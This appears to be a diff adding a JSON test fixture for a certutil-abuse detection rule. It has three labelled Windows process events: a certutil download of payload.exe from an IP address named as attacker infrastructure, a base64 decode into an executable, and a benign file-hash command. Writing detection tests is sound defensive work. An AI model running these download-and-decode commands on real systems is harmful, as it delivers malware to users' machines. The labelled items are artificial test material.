@@ -1,0 +1,26 @@
+[
+  {
+    "note": "Malicious: certutil used to fetch a second-stage payload from attacker infra",
+    "expected_detection": true,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\\Users\\Public\\update.exe",
+    "User": "CORP\\afong",
+    "TimeCreated": "2026-09-14T03:24:02Z"
+  },
+  {
+    "note": "Malicious: certutil decoding a base64 blob dropped by a phishing doc",
+    "expected_detection": true,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.exe",
+    "User": "CORP\\afong",
+    "TimeCreated": "2026-09-14T03:24:10Z"
+  },
+  {
+    "note": "Benign: certutil used normally to display a certificate's hash",
+    "expected_detection": false,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -hashfile C:\\Installers\\app_setup.msi SHA256",
+    "User": "CORP\\itadmin",
+    "TimeCreated": "2026-09-14T11:00:00Z"
+  }
+]
